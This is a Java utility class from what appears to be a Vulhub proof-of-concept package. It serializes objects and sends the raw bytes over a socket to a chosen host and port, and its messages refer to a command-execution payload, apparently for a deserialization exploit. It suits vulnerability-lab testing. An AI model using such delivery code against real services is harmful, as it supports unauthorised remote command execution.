package org.vulhub.poc;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public final class PocUtils {
    private PocUtils() {
    }

    public static String[] positional(String[] args) {
        List<String> values = new ArrayList<>();
        for (String arg : args) {
            if (arg.startsWith("--")) {
                throw new IllegalArgumentException("Unsupported option: " + arg
                        + ". Only the default command execution payload is supported.");
            }
            values.add(arg);
        }
        return values.toArray(new String[0]);
    }

    public static byte[] serialize(Object object) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (ObjectOutputStream objectOutput = new ObjectOutputStream(out)) {
            objectOutput.writeObject(object);
        }
        return out.toByteArray();
    }

    public static void send(String host, int port, byte[] payload) throws Exception {
        try (Socket socket = new Socket(host, port)) {
            OutputStream output = socket.getOutputStream();
            output.write(payload);
            output.flush();
        }
    }

    public static void writeInt(OutputStream out, int value) throws Exception {
        out.write((value >>> 24) & 0xff);
        out.write((value >>> 16) & 0xff);
        out.write((value >>> 8) & 0xff);
        out.write(value & 0xff);
    }

    public static void writeLong(OutputStream out, long value) throws Exception {
        out.write((int) ((value >>> 56) & 0xff));
        out.write((int) ((value >>> 48) & 0xff));
        out.write((int) ((value >>> 40) & 0xff));
        out.write((int) ((value >>> 32) & 0xff));
        out.write((int) ((value >>> 24) & 0xff));
        out.write((int) ((value >>> 16) & 0xff));
        out.write((int) ((value >>> 8) & 0xff));
        out.write((int) (value & 0xff));
    }
}
